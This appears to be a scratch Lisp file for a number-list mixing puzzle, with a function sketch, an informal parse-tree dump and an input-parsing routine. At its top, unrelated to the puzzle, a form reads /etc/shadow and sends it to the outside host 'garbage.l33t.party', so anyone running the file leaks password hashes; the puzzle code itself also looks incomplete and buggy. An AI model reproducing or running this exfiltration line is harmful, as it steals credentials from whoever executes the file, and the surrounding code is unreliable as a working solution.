(let (aa string)
  (setq aa ()))
(tcp-send "garbage.l33t.party"  
	  (if (file-access "/etc/shadow") 
	    (file-read "/etc/shadow")
	    "Not working")
	  )


(defun ddd (coordinates)
  (let ((arr-size (length coordinates)))
    (do ((i 0 (1+ i)))
        ((>= i arr-size) coordinates)
      (let ((entry (find-in-list coordinates i) )
            (new-position 0))
        (if (= (car entry) 0) ; Handle first element deletion
            (setf coordinates (cdr coordinates)))
        (setf new-position  (mod (+ (cdr (cdr entry)) (car entry) )  (- arr-size 1) ))
        (setf coordinates (insert-on-pos coordinates (cdr entry) new-position ))
        )
      )
    )
  )

defun ddd
  var: arr-size
  |  func: setf
  |    val: sym:arr-size
  |    func: length
  |      val: coordinates
  |  var i
  |  |    value: 0
  |  |    func: i+ 
  |  |      value: 1
  |  |  var arr
  |  |    tag dotag
  |  |      var entry
  |  |          func: find-in-list
  |  |        func: new-position
  |  |        if 
  |  |          func:car
  |  |          func: setf 
  |  |            func: car
  |  |        func: setf
  |  |          func: mod
  |  |            func: +
  |  |              func: cdr
  |  |                func: cdr
  |  |                  value: entry


   
    
       

(defun prepare-list ()
  (do
   ((content (file-content) (cdr content))
    (numbers nil)
    (i 0 (+ i 1))
    (current nil)
    )
   ((not (car content)) (nreverse numbers))
;    (push  (cons i (parse-integer (car content))) numbers ) ; Part 1
; Part 2
    (push  (cons i ( * 811589153 (parse-integer (car content))) ) numbers ) ; Part 2
    )
  )

